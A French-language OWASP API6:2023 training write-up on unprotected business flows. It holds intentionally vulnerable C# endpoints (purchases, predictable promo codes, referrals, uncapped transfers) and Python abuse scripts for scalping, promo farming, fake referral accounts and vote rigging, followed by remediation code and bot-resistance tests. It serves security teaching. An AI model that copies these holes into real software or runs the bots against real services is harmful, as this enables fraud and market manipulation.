# API6:2023 - Unrestricted Access to Sensitive Business Flows

## 📋 Description de la vulnérabilité

La vulnérabilité **Unrestricted Access to Sensitive Business Flows** se produit lorsqu'une API ne protège pas correctement les flux métiers sensibles contre l'automatisation excessive et les abus. Cette vulnérabilité permet aux attaquants d'exploiter les fonctionnalités légitimes de manière abusive, causant des pertes financières ou affectant la disponibilité du service.

### Impact potentiel
- Pertes financières dues aux abus (codes promo, cashback, etc.)
- Achat automatisé de produits en édition limitée (scalping)
- Création massive de comptes frauduleux
- Manipulation de votes et de classements
- Spam et abus des systèmes de notification
- Contournement des limites métier

## 🎯 Endpoints vulnérables

Le contrôleur `Api06BusinessFlowController` expose de nombreux flux métiers non protégés :

### 1. **Achats en édition limitée**
- `POST /api/business/purchase/limited-edition` - Achat sans protection anti-bot
- `GET /api/business/stock/limited-edition/{productId}` - Vérification de stock en temps réel

### 2. **Système de codes promotionnels**
- `POST /api/business/promo/generate` - Génération illimitée de codes
- `POST /api/business/promo/apply` - Application multiple de codes

### 3. **Système de parrainage**
- `POST /api/business/referral/register` - Création de comptes pour bonus
- `POST /api/business/referral/claim-bonus` - Réclamation illimitée

### 4. **Votes et reviews**
- `POST /api/business/vote/product` - Vote multiple sans restriction
- `POST /api/business/review/submit` - Soumission en masse de reviews

### 5. **Réservations**
- `POST /api/business/booking/reserve` - Réservation massive de créneaux
- `POST /api/business/booking/cancel/{bookingId}` - Annulation sans pénalité

### 6. **Transferts d'argent**
- `POST /api/business/transfer/money` - Transferts sans limite journalière

### 7. **Loterie et agrégation**
- `POST /api/business/lottery/enter` - Participation illimitée
- `GET /api/business/analytics/aggregate` - Agrégation coûteuse sans cache

## 🔍 Code vulnérable expliqué

### Exemple 1 : Achat de produits limités sans protection

```csharp
[HttpPost("purchase/limited-edition")]
public async Task<IActionResult> PurchaseLimitedEdition([FromBody] LimitedEditionPurchaseRequest request)
{
    // VULNÉRABLE: Pas de CAPTCHA
    // VULNÉRABLE: Pas de vérification du User-Agent
    // VULNÉRABLE: Pas de rate limiting
    // VULNÉRABLE: Pas de vérification d'identité forte

    var product = await _context.Products
        .FirstOrDefaultAsync(p => p.Id == request.ProductId && p.Category == "Limited Edition");

    if (product == null) return NotFound(new { error = "Product not found" });
    if (product.Stock <= 0) return BadRequest(new { error = "Out of stock" });

    // VULNÉRABLE: Simple décrémentation sans vérification transactionnelle
    product.Stock--;

    var order = new Order
    {
        UserId = request.UserId,
        Amount = product.Price,
        Status = "Confirmed",
        CreatedAt = DateTime.UtcNow
    };

    _context.Orders.Add(order);
    await _context.SaveChangesAsync();

    // VULNÉRABLE: Confirmation immédiate
    return Ok(new
    {
        orderId = order.Id,
        message = "Purchase successful",
        product = product.Name,
        remainingStock = product.Stock
    });
}
```

**Problèmes** :
- Aucune protection contre les bots
- Pas de limitation par utilisateur
- Confirmation immédiate permettant l'automatisation
- Information de stock facilitant le monitoring automatisé

### Exemple 2 : Génération abusive de codes promo

```csharp
[HttpPost("promo/generate")]
public IActionResult GeneratePromoCode([FromBody] PromoGenerationRequest request)
{
    // VULNÉRABLE: Pas de limite sur le nombre de codes générés
    // VULNÉRABLE: Codes prévisibles
    var code = $"PROMO{DateTime.Now.Ticks % 100000}";
    _voucherUsage[code] = 0;

    return Ok(new
    {
        promoCode = code,
        discount = request.DiscountPercent,
        validUntil = DateTime.UtcNow.AddDays(30)
    });
}

[HttpPost("promo/apply")]
public async Task<IActionResult> ApplyPromoCode([FromBody] PromoApplicationRequest request)
{
    // VULNÉRABLE: Pas de vérification du nombre d'utilisations par utilisateur
    // VULNÉRABLE: Application multiple possible
    
    _voucherUsage[request.PromoCode]++;
    
    var order = await _context.Orders.FindAsync(request.OrderId);
    order.Amount = order.Amount * 0.8m; // 20% de réduction
    
    await _context.SaveChangesAsync();
    
    return Ok(new { message = "Promo code applied" });
}
```

### Exemple 3 : Système de parrainage exploitable

```csharp
[HttpPost("referral/register")]
public async Task<IActionResult> RegisterWithReferral([FromBody] ReferralRegistrationRequest request)
{
    // VULNÉRABLE: Pas de vérification d'email
    // VULNÉRABLE: Pas de CAPTCHA
    // VULNÉRABLE: Création instantanée

    var newUser = new User
    {
        Email = request.NewUserEmail,
        Role = "User"
    };

    _context.Users.Add(newUser);
    await _context.SaveChangesAsync();

    // VULNÉRABLE: Bonus immédiat sans vérification
    _referralCodes[request.ReferrerEmail].Add(request.NewUserEmail);

    return Ok(new
    {
        message = "Referral successful",
        referrerBonus = 10, // $10 bonus
        newUserBonus = 5,  // $5 bonus
        totalReferrals = _referralCodes[request.ReferrerEmail].Count
    });
}
```

### Exemple 4 : Transferts d'argent non limités

```csharp
[HttpPost("transfer/money")]
public async Task<IActionResult> TransferMoney([FromBody] MoneyTransferRequest request)
{
    // VULNÉRABLE: Pas de limite journalière
    // VULNÉRABLE: Pas de vérification 2FA
    // VULNÉRABLE: Pas de délai de confirmation

    var sourceAccount = await _context.BankAccounts
        .FirstOrDefaultAsync(a => a.Id == request.SourceAccountId);
    var targetAccount = await _context.BankAccounts
        .FirstOrDefaultAsync(a => a.Id == request.TargetAccountId);

    // VULNÉRABLE: Transfert immédiat
    sourceAccount.Balance -= request.Amount;
    targetAccount.Balance += request.Amount;
    await _context.SaveChangesAsync();

    return Ok(new
    {
        message = "Transfer completed",
        transactionId = Guid.NewGuid(),
        amount = request.Amount
    });
}
```

## 💥 Scénarios d'exploitation

### Scénario 1 : Bot d'achat de sneakers
```python
import requests
import threading
import time

class SneakerBot:
    def __init__(self, base_url, user_tokens):
        self.base_url = base_url
        self.tokens = user_tokens
        
    def monitor_stock(self, product_id):
        """Surveille le stock en continu"""
        while True:
            response = requests.get(f"{self.base_url}/api/business/stock/limited-edition/{product_id}")
            data = response.json()
            
            if data['stock'] > 0:
                print(f"Stock disponible: {data['stock']}")
                self.launch_purchase_bots(product_id, data['stock'])
                break
                
            time.sleep(0.1)  # Check toutes les 100ms
    
    def launch_purchase_bots(self, product_id, stock):
        """Lance plusieurs threads pour acheter"""
        threads = []
        
        for i in range(min(stock, len(self.tokens))):
            thread = threading.Thread(
                target=self.purchase,
                args=(product_id, self.tokens[i])
            )
            threads.append(thread)
            thread.start()
        
        for thread in threads:
            thread.join()
    
    def purchase(self, product_id, token):
        """Effectue l'achat"""
        headers = {"Authorization": f"Bearer {token}"}
        response = requests.post(
            f"{self.base_url}/api/business/purchase/limited-edition",
            headers=headers,
            json={"productId": product_id, "quantity": 1}
        )
        
        if response.status_code == 200:
            print(f"Achat réussi: {response.json()}")
```

### Scénario 2 : Farming de codes promo
```python
def farm_promo_codes(base_url, count=1000):
    """Génère massivement des codes promo"""
    codes = []
    
    for i in range(count):
        response = requests.post(
            f"{base_url}/api/business/promo/generate",
            json={"discountPercent": 50}
        )
        
        if response.status_code == 200:
            code = response.json()['promoCode']
            codes.append(code)
    
    # Appliquer les codes sur des commandes
    for code in codes:
        # Créer une commande minimale
        order_response = requests.post(f"{base_url}/api/orders", 
            json={"items": [{"productId": 1, "quantity": 1}]})
        
        order_id = order_response.json()['orderId']
        
        # Appliquer le code
        requests.post(
            f"{base_url}/api/business/promo/apply",
            json={"orderId": order_id, "promoCode": code}
        )
    
    return codes
```

### Scénario 3 : Exploitation du système de parrainage
```python
import random
import string

def generate_fake_email():
    """Génère un email aléatoire"""
    domain = "@tempmail.com"
    username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    return username + domain

def exploit_referral_system(base_url, referrer_email, count=100):
    """Crée massivement des comptes pour les bonus"""
    total_bonus = 0
    
    for i in range(count):
        fake_email = generate_fake_email()
        
        response = requests.post(
            f"{base_url}/api/business/referral/register",
            json={
                "referrerEmail": referrer_email,
                "newUserEmail": fake_email
            }
        )
        
        if response.status_code == 200:
            total_bonus += 10  # $10 par parrainage
            print(f"Compte créé: {fake_email}, Bonus total: ${total_bonus}")
    
    # Réclamer le bonus
    claim_response = requests.post(
        f"{base_url}/api/business/referral/claim-bonus",
        json={"userEmail": referrer_email}
    )
    
    print(f"Bonus réclamé: {claim_response.json()}")
```

### Scénario 4 : Manipulation de votes
```python
def manipulate_product_ranking(base_url, product_id, votes=1000):
    """Manipule le classement d'un produit"""
    
    # Voter positivement pour notre produit
    for i in range(votes):
        requests.post(
            f"{base_url}/api/business/vote/product",
            json={"productId": product_id, "voteValue": 1}
        )
    
    # Voter négativement pour les concurrents
    competitor_ids = [2, 3, 4, 5]
    for comp_id in competitor_ids:
        for i in range(votes // 2):
            requests.post(
                f"{base_url}/api/business/vote/product",
                json={"productId": comp_id, "voteValue": -1}
            )
```

## 🛡️ Solutions de remédiation

### 1. **Implémenter un système de CAPTCHA**

```csharp
public interface ICaptchaService
{
    Task<bool> ValidateCaptcha(string token);
}

[HttpPost("purchase/limited-edition-secure")]
public async Task<IActionResult> PurchaseLimitedEditionSecure(
    [FromBody] SecurePurchaseRequest request,
    [FromServices] ICaptchaService captchaService)
{
    // Vérifier le CAPTCHA
    if (!await captchaService.ValidateCaptcha(request.CaptchaToken))
    {
        return BadRequest(new { error = "Invalid CAPTCHA" });
    }
    
    // Vérifier l'authentification forte (2FA)
    if (!await Validate2FA(request.TwoFactorCode))
    {
        return Unauthorized(new { error = "2FA required" });
    }
    
    // Limiter les achats par utilisateur
    var userId = GetCurrentUserId();
    var recentPurchases = await _context.Orders
        .CountAsync(o => o.UserId == userId 
            && o.CreatedAt > DateTime.UtcNow.AddHours(-24)
            && o.ProductCategory == "Limited Edition");
    
    if (recentPurchases >= 2)
    {
        return BadRequest(new { error = "Purchase limit reached (2 per 24h)" });
    }
    
    // Transaction avec verrouillage pessimiste
    using var transaction = await _context.Database.BeginTransactionAsync();
    
    var product = await _context.Products
        .Where(p => p.Id == request.ProductId)
        .FirstOrDefaultAsync();
    
    if (product == null || product.Stock <= 0)
    {
        await transaction.RollbackAsync();
        return BadRequest(new { error = "Product unavailable" });
    }
    
    product.Stock--;
    
    // Ajouter à une file d'attente au lieu de confirmer immédiatement
    var order = new Order
    {
        UserId = userId,
        ProductId = product.Id,
        Status = "Pending",
        CreatedAt = DateTime.UtcNow
    };
    
    _context.Orders.Add(order);
    await _context.SaveChangesAsync();
    await transaction.CommitAsync();
    
    // Traitement asynchrone
    await _queueService.EnqueueOrderProcessing(order.Id);
    
    return Ok(new
    {
        orderId = order.Id,
        message = "Order queued for processing",
        estimatedProcessingTime = "2-5 minutes"
    });
}
```

### 2. **Système de rate limiting adaptatif**

```csharp
public class AdaptiveRateLimiter
{
    private readonly IMemoryCache _cache;
    private readonly ILogger<AdaptiveRateLimiter> _logger;
    
    public async Task<bool> CheckRateLimit(string userId, string action)
    {
        var key = $"rate_limit:{action}:{userId}";
        var attempts = _cache.Get<List<DateTime>>(key) ?? new List<DateTime>();
        
        // Nettoyer les anciennes tentatives
        attempts = attempts.Where(a => a > DateTime.UtcNow.AddMinutes(-10)).ToList();
        
        // Détecter les patterns suspects
        if (IsPatternSuspicious(attempts))
        {
            _logger.LogWarning("Suspicious pattern detected for user {UserId} on action {Action}", 
                userId, action);
            return false;
        }
        
        // Limites adaptatives selon l'action
        var limit = action switch
        {
            "purchase_limited" => 2,
            "generate_promo" => 5,
            "create_referral" => 3,
            "submit_review" => 10,
            _ => 20
        };
        
        if (attempts.Count >= limit)
        {
            return false;
        }
        
        attempts.Add(DateTime.UtcNow);
        _cache.Set(key, attempts, TimeSpan.FromMinutes(10));
        
        return true;
    }
    
    private bool IsPatternSuspicious(List<DateTime> attempts)
    {
        if (attempts.Count < 3) return false;
        
        // Vérifier si les requêtes sont trop régulières (bot)
        var intervals = new List<double>();
        for (int i = 1; i < attempts.Count; i++)
        {
            intervals.Add((attempts[i] - attempts[i-1]).TotalMilliseconds);
        }
        
        var avgInterval = intervals.Average();
        var variance = intervals.Select(i => Math.Pow(i - avgInterval, 2)).Average();
        
        // Si la variance est très faible, c'est probablement un bot
        return variance < 100; // Moins de 100ms de variance
    }
}
```

### 3. **Validation métier renforcée**

```csharp
[HttpPost("promo/generate-secure")]
[Authorize]
public async Task<IActionResult> GeneratePromoCodeSecure([FromBody] PromoGenerationRequest request)
{
    var userId = GetCurrentUserId();
    
    // Vérifier les permissions
    var user = await _context.Users.FindAsync(userId);
    if (!user.Permissions.Contains("promo:generate"))
    {
        return Forbid();
    }
    
    // Limiter la génération
    var generatedToday = await _context.PromoCodes
        .CountAsync(p => p.GeneratedBy == userId 
            && p.GeneratedAt > DateTime.UtcNow.Date);
    
    if (generatedToday >= 5)
    {
        return BadRequest(new { error = "Daily generation limit reached" });
    }
    
    // Générer un code sécurisé
    var code = GenerateSecurePromoCode();
    
    var promoCode = new PromoCode
    {
        Code = code,
        DiscountPercent = Math.Min(request.DiscountPercent, 20), // Max 20%
        GeneratedBy = userId,
        GeneratedAt = DateTime.UtcNow,
        ValidUntil = DateTime.UtcNow.AddDays(7), // Durée limitée
        MaxUses = 1, // Usage unique
        UsedCount = 0
    };
    
    _context.PromoCodes.Add(promoCode);
    await _context.SaveChangesAsync();
    
    // Log pour audit
    _logger.LogInformation("Promo code {Code} generated by user {UserId}", code, userId);
    
    return Ok(new
    {
        promoCode = code,
        validUntil = promoCode.ValidUntil,
        maxUses = promoCode.MaxUses
    });
}

private string GenerateSecurePromoCode()
{
    var bytes = new byte[16];
    using (var rng = RandomNumberGenerator.Create())
    {
        rng.GetBytes(bytes);
    }
    return Convert.ToBase64String(bytes)
        .Replace("+", "")
        .Replace("/", "")
        .Replace("=", "")
        .Substring(0, 12)
        .ToUpper();
}
```

### 4. **File d'attente pour les opérations sensibles**

```csharp
public interface IBusinessFlowQueue
{
    Task EnqueuePurchase(PurchaseRequest request);
    Task EnqueueTransfer(TransferRequest request);
    Task ProcessQueue();
}

[HttpPost("transfer/money-secure")]
[Authorize]
public async Task<IActionResult> TransferMoneySecure([FromBody] MoneyTransferRequest request)
{
    var userId = GetCurrentUserId();
    
    // Vérifier les limites journalières
    var dailyTransferred = await _context.Transfers
        .Where(t => t.UserId == userId && t.CreatedAt > DateTime.UtcNow.Date)
        .SumAsync(t => t.Amount);
    
    if (dailyTransferred + request.Amount > 10000) // Limite de 10k par jour
    {
        return BadRequest(new { error = "Daily transfer limit exceeded" });
    }
    
    // Vérifier le solde
    var account = await _context.BankAccounts.FindAsync(request.SourceAccountId);
    if (account.Balance < request.Amount)
    {
        return BadRequest(new { error = "Insufficient balance" });
    }
    
    // Créer une demande de transfert (pas de transfert immédiat)
    var transfer = new TransferRequest
    {
        Id = Guid.NewGuid(),
        UserId = userId,
        SourceAccountId = request.SourceAccountId,
        TargetAccountId = request.TargetAccountId,
        Amount = request.Amount,
        Status = "Pending",
        CreatedAt = DateTime.UtcNow,
        ScheduledFor = DateTime.UtcNow.AddMinutes(5) // Délai de 5 minutes
    };
    
    _context.TransferRequests.Add(transfer);
    await _context.SaveChangesAsync();
    
    // Envoyer notification pour confirmation
    await _notificationService.SendTransferConfirmation(userId, transfer.Id);
    
    return Ok(new
    {
        transferId = transfer.Id,
        status = "Pending confirmation",
        scheduledFor = transfer.ScheduledFor,
        message = "Please confirm via email/SMS within 5 minutes"
    });
}
```

### 5. **Détection de comportements anormaux**

```csharp
public class AnomalyDetectionService
{
    private readonly ILogger<AnomalyDetectionService> _logger;
    private readonly AppDbContext _context;
    
    public async Task<bool> IsUserBehaviorNormal(int userId, string action)
    {
        var userHistory = await _context.UserActions
            .Where(a => a.UserId == userId && a.Timestamp > DateTime.UtcNow.AddDays(-30))
            .OrderBy(a => a.Timestamp)
            .ToListAsync();
        
        // Analyser les patterns
        var hourlyActivity = userHistory
            .GroupBy(a => a.Timestamp.Hour)
            .ToDictionary(g => g.Key, g => g.Count());
        
        var currentHour = DateTime.UtcNow.Hour;
        var typicalActivityThisHour = hourlyActivity.GetValueOrDefault(currentHour, 0);
        
        // Si l'activité est 10x supérieure à la normale
        var recentActivity = userHistory.Count(a => a.Timestamp > DateTime.UtcNow.AddMinutes(-10));
        if (recentActivity > typicalActivityThisHour * 10)
        {
            _logger.LogWarning("Abnormal activity detected for user {UserId}", userId);
            return false;
        }
        
        // Vérifier la vélocité des actions
        var recentActions = userHistory
            .Where(a => a.Timestamp > DateTime.UtcNow.AddMinutes(-1))
            .ToList();
        
        if (recentActions.Count > 10) // Plus de 10 actions par minute
        {
            return false;
        }
        
        return true;
    }
}
```

## 🔧 Bonnes pratiques

1. **CAPTCHA sur les actions sensibles** : Implémenter reCAPTCHA ou hCaptcha
2. **Authentification forte** : 2FA pour les opérations critiques
3. **Rate limiting intelligent** : Limites adaptatives selon le comportement
4. **Files d'attente** : Traitement asynchrone des opérations sensibles
5. **Délais de confirmation** : Ajouter des délais pour les actions irréversibles
6. **Monitoring en temps réel** : Détecter les patterns anormaux
7. **Limites métier** : Implémenter des limites quotidiennes/mensuelles
8. **Vérification d'identité** : KYC pour les opérations financières importantes
9. **Honeypots** : Détecter les bots avec des champs cachés
10. **Analyse comportementale** : Machine learning pour détecter les anomalies

## 📊 Tests de détection

### Test de résistance aux bots
```python
import time
import requests
from concurrent.futures import ThreadPoolExecutor

def test_bot_resistance(base_url, endpoint, payload, iterations=100):
    results = {
        "successful": 0,
        "rate_limited": 0,
        "captcha_required": 0,
        "other_errors": 0
    }
    
    def make_request():
        response = requests.post(f"{base_url}{endpoint}", json=payload)
        
        if response.status_code == 200:
            results["successful"] += 1
        elif response.status_code == 429:
            results["rate_limited"] += 1
        elif "captcha" in response.text.lower():
            results["captcha_required"] += 1
        else:
            results["other_errors"] += 1
        
        return response.status_code
    
    # Test séquentiel rapide
    start_time = time.time()
    for i in range(iterations):
        make_request()
    
    sequential_time = time.time() - start_time
    
    # Test parallèle
    with ThreadPoolExecutor(max_workers=10) as executor:
        parallel_start = time.time()
        futures = [executor.submit(make_request) for _ in range(iterations)]
        for future in futures:
            future.result()
    
    parallel_time = time.time() - parallel_start
    
    print(f"Résultats du test:")
    print(f"- Requêtes réussies: {results['successful']}/{iterations*2}")
    print(f"- Rate limited: {results['rate_limited']}")
    print(f"- CAPTCHA demandé: {results['captcha_required']}")
    print(f"- Temps séquentiel: {sequential_time:.2f}s")
    print(f"- Temps parallèle: {parallel_time:.2f}s")
    
    # Évaluation
    if results['successful'] > iterations * 0.1:  # Plus de 10% de succès
        print("❌ VULNÉRABLE: Trop de requêtes acceptées")
    else:
        print("✅ PROTÉGÉ: Bonne résistance aux bots")
```

### Simulation d'attaque business
```python
def simulate_business_attack(base_url):
    attacks = {
        "promo_farming": test_promo_code_farming,
        "referral_abuse": test_referral_system_abuse,
        "vote_manipulation": test_vote_manipulation,
        "inventory_hoarding": test_inventory_hoarding
    }
    
    results = {}
    
    for attack_name, attack_func in attacks.items():
        print(f"\nTest: {attack_name}")
        try:
            result = attack_func(base_url)
            results[attack_name] = result
        except Exception as e:
            results[attack_name] = {"error": str(e)}
    
    return results
```

## ⚠️ Attention

Ce code est **intentionnellement vulnérable** et ne doit **JAMAIS** être utilisé en production. Il sert uniquement à des fins éducatives pour comprendre et apprendre à détecter les vulnérabilités liées aux flux métiers.

## 📚 Références

- [OWASP API Security Top 10 2023 - Unrestricted Access to Sensitive Business Flows](https://owasp.org/API-Security/editions/2023/en/0xa6-unrestricted-access-to-sensitive-business-flows/)
- [Bot Management Best Practices](https://owasp.org/www-community/controls/Bot_Management)
- [Business Logic Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Business_Logic_Security_Cheat_Sheet.html)
- [CWE-799: Improper Control of Interaction Frequency](https://cwe.mitre.org/data/definitions/799.html)